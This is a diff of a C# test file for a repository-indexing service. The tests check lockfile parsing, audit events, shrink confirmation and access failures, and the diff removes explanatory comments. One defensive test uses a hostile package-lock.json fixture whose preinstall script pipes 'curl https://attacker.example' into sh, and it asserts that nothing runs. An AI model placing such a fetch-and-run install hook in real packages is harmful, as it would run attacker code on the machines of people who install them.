@@ -12,10 +12,6 @@ using Microsoft.Extensions.DependencyInjection;
 
 namespace Ardea.Iam.Tests;
 
-/// <summary>
-/// Reading a repository into the profile (task 2.13; master plan 16.2, 16.5, 16.6; phase 2
-/// acceptance), against a scripted repository host.
-/// </summary>
 public sealed class IndexRepositoryTests(PostgresServer server)
 {
     [Fact]
@@ -35,7 +31,6 @@ public sealed class IndexRepositoryTests(PostgresServer server)
         Assert.Equal("nodejs 20", await host.ScalarAsync<string>("SELECT product_key || ' ' || version FROM assets.component_suggestion WHERE state = 'open'"));
         Assert.Equal($"repository:acme/portal@a1", await host.ScalarAsync<string>("SELECT origin FROM platform.audit_event WHERE action = 'repository.indexed'"));
 
-        // Dependabot raised lodash; the next reading changes that one component.
         github.Commit("b2", Lockfile(("lodash", "4.17.21", false, true), ("jest", "29.7.0", true, true), ("jest-util", "29.7.0", true, false)), ("Dockerfile", "FROM node:20-alpine\n"));
         await RunAsync(host, orgId, linkId);
 
@@ -44,10 +39,8 @@ public sealed class IndexRepositoryTests(PostgresServer server)
         Assert.Equal("4.17.21", second.Single(c => c.Name == "lodash").Version);
         Assert.Equal("0/1/0", await host.ScalarAsync<string>(
             "SELECT concat_ws('/', data->>'created', data->>'updated', data->>'removed') FROM platform.audit_event WHERE action = 'repository.indexed' ORDER BY at DESC LIMIT 1"));
-        // The suggestion keeps its identity: still one, not a second for the same evidence.
         Assert.Equal(1L, await host.ScalarAsync<long>("SELECT count(*) FROM assets.component_suggestion"));
 
-        // The same commit again: nothing is read.
         var reads = github.FileReads;
         await RunAsync(host, orgId, linkId);
         Assert.Equal(reads, github.FileReads);
@@ -64,19 +57,16 @@ public sealed class IndexRepositoryTests(PostgresServer server)
         await RunAsync(host, orgId, linkId);
         Assert.Equal(12, (await ComponentsAsync(host, projectId)).Count);
 
-        // The lockfile went missing in the new commit: 12 → 2 packages.
         github.Commit("b2", Lockfile(("pkg-1", "1.0.0", false, true), ("pkg-2", "1.0.0", false, true)));
         await RunAsync(host, orgId, linkId);
         Assert.Equal(12, (await ComponentsAsync(host, projectId)).Count);
         var link = (await Json(await client.GetAsync($"/api/v1/orgs/{orgId}/projects/{projectId}/repositories"))).EnumerateArray().Single();
         Assert.True(link.GetProperty("shrinkPending").GetBoolean());
 
-        // A person confirms: the held-back state applies.
         Assert.Equal(HttpStatusCode.NoContent, (await client.PostAsync($"/api/v1/orgs/{orgId}/projects/{projectId}/repositories/{linkId}/confirm-shrink")).StatusCode);
         await RunAsync(host, orgId, linkId, applyShrink: true);
         Assert.Equal(["pkg-1", "pkg-2"], (await ComponentsAsync(host, projectId)).Select(c => c.Name).Order());
 
-        // GitHub refuses access: the link fails, the profile stays.
         github.Commit("c3", Lockfile(("pkg-9", "9.0.0", false, true)));
         github.Failure = RepositoryFailure.Forbidden;
         await RunAsync(host, orgId, linkId);
@@ -87,7 +77,6 @@ public sealed class IndexRepositoryTests(PostgresServer server)
     [Fact]
     public async Task A_prepared_repository_is_read_as_data_within_its_limits()
     {
-        // Phase 2 acceptance: an oversized file, a lock file with install scripts and XML with an external entity.
         var hooks = """
             {"name":"evil","lockfileVersion":3,"packages":{
               "":{"name":"evil","dependencies":{"left-pad":"1.3.0"},"scripts":{"preinstall":"curl https://attacker.example | sh"}},
@@ -108,7 +97,6 @@ public sealed class IndexRepositoryTests(PostgresServer server)
 
         await RunAsync(host, orgId, linkId);
 
-        // The package is listed, nothing ran; the oversized file was never fetched; the entity gave nothing.
         Assert.Equal(["left-pad 1.3.0 runtime direct"], (await ComponentsAsync(host, projectId)).Select(c => c.Describe));
         Assert.DoesNotContain("big/package-lock.json", github.Fetched);
         Assert.Equal(0L, await host.ScalarAsync<long>("SELECT count(*) FROM assets.component_suggestion"));
@@ -131,7 +119,6 @@ public sealed class IndexRepositoryTests(PostgresServer server)
         await RunAsync(host, orgId, linkId);
         Assert.Equal(1L, await host.ScalarAsync<long>("SELECT count(*) FROM platform.audit_event WHERE action = 'repository.unavailable'"));
 
-        // Back to normal: the failure ends.
         github.Failure = null;
         github.Commit("a1", Lockfile(("lodash", "4.17.21", false, true)));
         await RunAsync(host, orgId, linkId);
@@ -192,7 +179,6 @@ public sealed class IndexRepositoryTests(PostgresServer server)
         return (client, orgId, projectId, linkId);
     }
 
-    /// <summary>A package-lock.json v3 with the given packages; direct ones are declared by the root.</summary>
     private static (string Path, string Content) Lockfile(params (string Name, string Version, bool Dev, bool Direct)[] packages)
     {
         var root = new Dictionary<string, object>
@@ -216,7 +202,6 @@ public sealed class IndexRepositoryTests(PostgresServer server)
         return await response.Content.ReadFromJsonAsync<JsonElement>();
     }
 
-    /// <summary>A repository whose head moves to the last scripted commit; no SBOM (graph not enabled).</summary>
     private sealed class ScriptedRepository : IRepositoryHost
     {
         private readonly Dictionary<string, Dictionary<string, string>> _commits = [];
